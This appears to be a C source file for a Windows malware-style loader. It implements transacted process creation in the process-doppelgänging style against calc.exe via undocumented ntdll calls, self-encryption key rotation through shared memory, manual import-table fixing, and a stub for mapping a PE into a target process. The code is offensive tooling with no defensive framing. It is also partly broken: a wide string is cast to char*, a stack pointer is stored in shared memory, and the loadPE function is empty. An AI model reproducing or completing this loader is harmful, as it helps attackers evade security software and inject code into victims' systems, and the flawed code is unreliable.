#include "loader.h"

ULONGLONG getPEFileSize(const char* peFilePath) {
    // Open the PE file
    FILE* file = fopen(peFilePath, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return 0;
    }

    // Read the DOS Header
    IMAGE_DOS_HEADER dosHeader;
    if (fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file) != 1) {
        fprintf(stderr, "Failed to read DOS header\n");
        fclose(file);
        return 0;
    }

    // Check for the 'MZ' signature
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "Invalid PE file (not a valid DOS header)\n");
        fclose(file);
        return 0;
    }

    // Move to the NT Header
    if (fseek(file, dosHeader.e_lfanew, SEEK_SET) != 0) {
        fprintf(stderr, "Failed to seek to NT header\n");
        fclose(file);
        return 0;
    }

    // Read the NT Header
    IMAGE_NT_HEADERS ntHeaders;
    if (fread(&ntHeaders, sizeof(IMAGE_NT_HEADERS), 1, file) != 1) {
        fprintf(stderr, "Failed to read NT header\n");
        fclose(file);
        return 0;
    }

    // Check for the 'PE\0\0' signature
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "Invalid PE file (not a valid NT header)\n");
        fclose(file);
        return 0;
    }

    // Calculate the PE file size
    ULONGLONG fileSize = ntHeaders.OptionalHeader.SizeOfHeaders;
    for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER sectionHeader;
        if (fread(&sectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file) != 1) {
            fprintf(stderr, "Failed to read section header\n");
            fclose(file);
            return 0;
        }

        fileSize += sectionHeader.SizeOfRawData;
    }

    fclose(file);

    printf("Total PE File Size: %llu bytes\n", fileSize);
    return fileSize;
}


ULONGLONG getPEBasePhysicalAddress(const char* firstPEFilePath) {
    // Get the size of the first PE file
    ULONGLONG firstPEFileSize = getPEFileSize(firstPEFilePath);
    if (firstPEFileSize == 0) {
        fprintf(stderr, "Failed to get PE file size\n");
        return 0;
    }

    // The base address of the second PE will be right after the first PE
    ULONGLONG secondPEBaseAddress = firstPEFileSize;

    printf("Base physical Address of second PE: 0x%llX\n", secondPEBaseAddress);

    return secondPEBaseAddress;
}

void passProcessInfo() {
    UINT_PTR baseAddress = (UINT_PTR)GetModuleHandle(NULL);
    if (baseAddress == 0) {
        printf("Error: Unable to get module handle.\n");
        return; // Exit with an error
    }
    printf("Base Address: 0x%llX\n", baseAddress);

    // Shared Memory Structure
    ProcessData *data = NULL;
    HANDLE hMapFile;

    // Create or open shared memory
    hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ProcessData), SHARED_MEMORY_NAME);
    if (hMapFile == NULL) {
        fprintf(stderr, "Could not create file mapping object (%ld).\n", GetLastError());
        return;
    }

    // Map the shared memory into the process's address space
    data = (ProcessData*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ProcessData));
    if (data == NULL) {
        fprintf(stderr, "Could not map view of file (%ld).\n", GetLastError());
        CloseHandle(hMapFile);
        return;
    }

    // Analyze the executable to retrieve the function information
    FunctionInfo* functions = NULL;
    size_t numFunctions = 0;

    functions = analyzeExecutable(&numFunctions);
    if (functions == NULL || numFunctions == 0) {
        fprintf(stderr, "No functions found or failed to analyze executable.\n");
        return;
    }
    data->functions = functions;
    data->numFunctions = numFunctions;

    // Generate next decryption key
    srand(time(NULL));
    unsigned char nextEncryptionKey = (unsigned char)(rand() % 256);
    data->nextEncryptionKey = nextEncryptionKey;

    // Encryption key (should match the key used during encryption)
    unsigned char encryptionKey = 0x00;
    encryptionKey = *((unsigned char*)(baseAddress + getMetaSectionAddress(baseAddress) + getMetaSectionVirtualSize(baseAddress) - sizeof(encryptionKey)));

    if (encryptionKey == 0x00) {
        printf("Encryption Key not found.\n");
        exit(0);
    }

    unsigned char recryptionKey = nextEncryptionKey ^ encryptionKey;
    data->recryptionKey = recryptionKey;

    // Get the current executable path
    char executablePath[512];
    if (GetModuleFileName(NULL, executablePath, sizeof(executablePath)) == 0) {
        fprintf(stderr, "Error getting executable path: %ld\n", GetLastError());
        return;
    }

    data->executablePath = executablePath;
    printf("Current executable path: %s\n", executablePath);

    // Map base address for key storage
    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress);
    data->keyAddress = keyAddress;

    // Close the shared memory
    UnmapViewOfFile(data);
    CloseHandle(hMapFile);
}

HANDLE createProcess() {
    HANDLE hProcess;
    OBJECT_ATTRIBUTES objattr;
    UNICODE_STRING objname;
    NTSTATUS status;
    WCHAR wstrObjName[MAX_PATH];
    lstrcpyW(wstrObjName, L"C:\\Windows\\System32\\calc.exe");

    // Load ntdll.dll
    HINSTANCE hNtDll = LoadLibrary("ntdll.dll");
    if (hNtDll == NULL) {
        fprintf(stderr, "Failed to load ntdll.dll\n");
        return NULL;
    }

    // Get function pointers
    fpNtCreateProcessEx _NtCreateProcessEx = (fpNtCreateProcessEx)GetProcAddress(hNtDll, "NtCreateProcessEx");
    fpNtCreateTransaction _NtCreateTransaction = (fpNtCreateTransaction)GetProcAddress(hNtDll, "NtCreateTransaction");
    fpNtCreateSection _NtCreateSection = (fpNtCreateSection)GetProcAddress(hNtDll, "NtCreateSection");
    fpNtClose _NtClose = (fpNtClose)GetProcAddress(hNtDll, "NtClose");
    fpNtResumeProcess _NtResumeProcess = (fpNtResumeProcess)GetProcAddress(hNtDll, "NtResumeProcess");

    if (_NtCreateProcessEx == NULL || _NtCreateTransaction == NULL || _NtCreateSection == NULL || _NtClose == NULL || _NtResumeProcess == NULL) {
        fprintf(stderr, "Failed to get the address of required functions\n");
        FreeLibrary(hNtDll);
        return NULL;
    }

    // Initialize ObjectName UNICODE_STRING
    objname.Buffer = wstrObjName;
    objname.Length = wcslen(wstrObjName) * sizeof(WCHAR); // Length in bytes of string, without null terminator
    objname.MaximumLength = MAX_PATH * sizeof(WCHAR);

    // Initialize OBJECT_ATTRIBUTES
    objattr.Length = sizeof(OBJECT_ATTRIBUTES);
    objattr.RootDirectory = NULL;
    objattr.ObjectName = NULL;
    objattr.Attributes = OBJ_CASE_INSENSITIVE | OBJ_EXCLUSIVE; // OBJ_CASE_INSENSITIVE | OBJ_EXCLUSIVE
    objattr.SecurityDescriptor = NULL;
    objattr.SecurityQualityOfService = NULL;

    HANDLE hTransaction = NULL;
    status = _NtCreateTransaction(
        &hTransaction,
        TRANSACTION_ALL_ACCESS,
        &objattr,
        NULL,
        NULL,
        0,
        0,
        0,
        NULL,
        NULL);

    const char *strObjName = (const char *)wstrObjName;
    HANDLE hTransactedFile = CreateFileTransacted(
        strObjName,
        GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL);

    HANDLE hSection = NULL;
    status = _NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_EXECUTE,
        SEC_IMAGE,
        hTransactedFile);

    status = _NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

    // Check status
    if (status != 0) {
        fprintf(stderr, "NtCreateProcessEx failed with status 0x%lx\n", status);
        CloseHandle(hTransactedFile);
        _NtClose(hTransaction);
        _NtClose(hSection);
        FreeLibrary(hNtDll);
        return NULL;
    }

    DWORD pid = GetProcessId(hProcess);
    printf("Successfully created process\n");
    printf("PID = %lu\n", pid);


    HANDLE snapshot = CreateToolhelp32Snapshot(0x00000004, 0); //TH32CS_SNAPTHREAD
    if (snapshot == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Failed to create thread snapshot (Error: %lu)\n", GetLastError());
        return NULL;
    }
    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(snapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == GetProcessId(hProcess)) {
                printf("Thread ID: %lu\n", te.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &te));
    }
    CloseHandle(snapshot);

    Sleep(10000);

    // Resume the primary thread of the process
    //HANDLE hThread;
    status = _NtResumeProcess(hProcess);
    if (status != 0) {
        fprintf(stderr, "NtResumeThread failed with status 0x%lx\n", status);
    } else {
        printf("Process resumed successfully and is now running.\n");
    }

    Sleep(10000);

    // Cleanup
    CloseHandle(hTransactedFile);
    _NtClose(hTransaction);
    _NtClose(hSection);
    FreeLibrary(hNtDll);

    return hProcess;
}


void fixIAT(UINT_PTR baseAddress) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY* importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (importDir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(baseAddress + importDir->VirtualAddress);
        while (importDesc->Name) {
            char* moduleName = (char*)(baseAddress + importDesc->Name);
            HMODULE moduleHandle = LoadLibraryA(moduleName);
            if (moduleHandle) {
                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(baseAddress + importDesc->FirstThunk);
                while (thunk->u1.Function) {
                    IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(baseAddress + thunk->u1.AddressOfData);
                    FARPROC procAddress = GetProcAddress(moduleHandle, importByName->Name);
                    thunk->u1.Function = (UINT_PTR)procAddress;
                    thunk++;
                }
            }
            importDesc++;
        }
    }
}

void loadPE(UINT_PTR processBaseAddress, const char *peFilePath) {
    // Open the PE file
    FILE *file = fopen(peFilePath, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return;
    }

    // Read and map the PE file into the target process
    // Use VirtualAllocEx for allocating space in the target process

    fclose(file);
}